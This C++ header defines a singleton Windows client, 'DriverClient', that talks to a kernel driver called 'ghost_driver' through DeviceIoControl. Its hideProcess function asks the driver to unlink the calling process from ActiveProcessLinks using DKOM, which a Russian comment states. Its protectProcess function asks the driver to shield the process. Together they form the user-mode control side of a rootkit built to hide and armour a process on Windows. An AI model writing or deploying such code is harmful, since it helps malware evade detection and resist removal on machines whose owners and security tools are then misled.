#pragma once

#include <windows.h>
#include <iostream>
#include "../driver_ring0/ghost_driver.h"

class DriverClient {
public:
    static DriverClient& instance() {
        static DriverClient inst;
        return inst;
    }

    bool isConnected() const {
        return m_hDevice != INVALID_HANDLE_VALUE;
    }

    // Запрос к Ring 0 драйверу на скрытие текущего процесса из ActiveProcessLinks (DKOM)
    bool hideProcess(DWORD pid = 0) {
        if (!isConnected()) return false;
        if (pid == 0) pid = GetCurrentProcessId();

        GHOST_PROCESS_REQUEST req;
        req.ProcessId = pid;
        req.Flags = 0;

        DWORD bytesReturned = 0;
        BOOL ok = DeviceIoControl(
            m_hDevice,
            IOCTL_GHOST_HIDE_PROCESS,
            &req, sizeof(req),
            NULL, 0,
            &bytesReturned,
            NULL
        );
        return (ok == TRUE);
    }

    // Запрос на защиту процесса
    bool protectProcess(DWORD pid = 0) {
        if (!isConnected()) return false;
        if (pid == 0) pid = GetCurrentProcessId();

        GHOST_PROCESS_REQUEST req;
        req.ProcessId = pid;
        req.Flags = 1;

        DWORD bytesReturned = 0;
        BOOL ok = DeviceIoControl(
            m_hDevice,
            IOCTL_GHOST_PROTECT_PROCESS,
            &req, sizeof(req),
            NULL, 0,
            &bytesReturned,
            NULL
        );
        return (ok == TRUE);
    }

private:
    DriverClient() {
        m_hDevice = CreateFileA(
            GHOST_USER_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            0,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
    }

    ~DriverClient() {
        if (m_hDevice != INVALID_HANDLE_VALUE) {
            CloseHandle(m_hDevice);
            m_hDevice = INVALID_HANDLE_VALUE;
        }
    }

    HANDLE m_hDevice = INVALID_HANDLE_VALUE;
};
